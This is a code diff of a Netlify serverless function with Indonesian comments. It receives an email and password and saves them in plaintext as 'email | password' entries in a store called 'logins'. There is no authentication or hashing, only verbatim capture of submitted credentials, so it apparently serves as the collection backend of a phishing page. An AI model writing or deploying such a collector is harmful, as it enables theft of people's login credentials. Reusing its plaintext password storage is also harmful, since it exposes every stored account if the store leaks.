@@ -1,29 +1,32 @@
 // netlify/functions/save.js
+import { blobs } from '@netlify/blobs';
 
 export default async (request) => {
   try {
-    const body = await request.json();
-    const email = body.email;
-    const password = body.password;
+    const { email, password } = await request.json();
 
-    const kv = await import("@netlify/kv");
-    
-    const timestamp = new Date().toISOString();
-    const entry = `${timestamp} | ${email} | ${password}`;
+    // buat / akses store bernama "logins"
+    const store = blobs.store("logins");
 
-    // Simpan append ke list "logins"
-    await kv.set(`login-${timestamp}`, entry);
+    const timestamp = Date.now();
 
-    return new Response(
-      JSON.stringify({ success: true }),
-      { status: 200 }
-    );
+    // key unik per login
+    const key = `login-${timestamp}`;
 
-  } catch (err) {
-    return new Response(
-      JSON.stringify({ error: err.message }),
-      { status: 500 }
-    );
+    const value = `${email} | ${password}`;
+
+    // simpan value ke blobs
+    await store.set(key, value);
+
+    return new Response(JSON.stringify({ success: true }), {
+      status: 200,
+      headers: { "Content-Type": "application/json" }
+    });
+
+  } catch (error) {
+    return new Response(JSON.stringify({ error: error.message }), {
+      status: 500,
+      headers: { "Content-Type": "application/json" }
+    });
   }
 };
-
